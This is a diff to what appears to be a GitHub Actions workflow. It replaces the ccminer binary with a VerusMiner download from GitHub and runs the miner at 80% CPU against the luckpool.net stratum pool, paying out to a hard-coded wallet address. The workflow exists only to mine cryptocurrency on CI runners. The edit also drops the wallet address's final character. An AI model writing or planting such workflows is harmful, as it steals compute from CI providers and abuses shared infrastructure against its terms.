@@ -14,18 +14,18 @@ jobs:
     - name: Update system
       run: |
         sudo apt update
-        sudo apt install wget cpulimit -y
+        sudo apt install wget tar cpulimit -y
 
-    - name: Download Verus Miner
+    - name: Download VerusMiner
       run: |
-        wget https://github.com/monkins1010/ccminer/releases/download/v3.8.3/ccminer-x86-64
-        chmod +x ccminer-x86-64
+        wget https://github.com/hellcatz/verusminer/releases/download/v0.8.1/verusminer-linux.tar.gz
+        tar -xvf verusminer-linux.tar.gz
+        chmod +x verusminer
 
-    - name: Start Mining (80% CPU limit)
+    - name: Start Mining (80% CPU)
       run: |
-        cpulimit -l 80 -- ./ccminer-x86-64 \
-        -a verus \
+        cpulimit -l 80 -- ./verusminer \
         -o stratum+tcp://na.luckpool.net:3956 \
-        -u RQLTCKt8WJAMwfW29tZfn8jJ6WeoNmkP4P4.worker \
+        -u RQLTCKt8WJAMwfW29tZfn8jJ6WeoNmkP4P.worker \
         -p x \
         -t 1
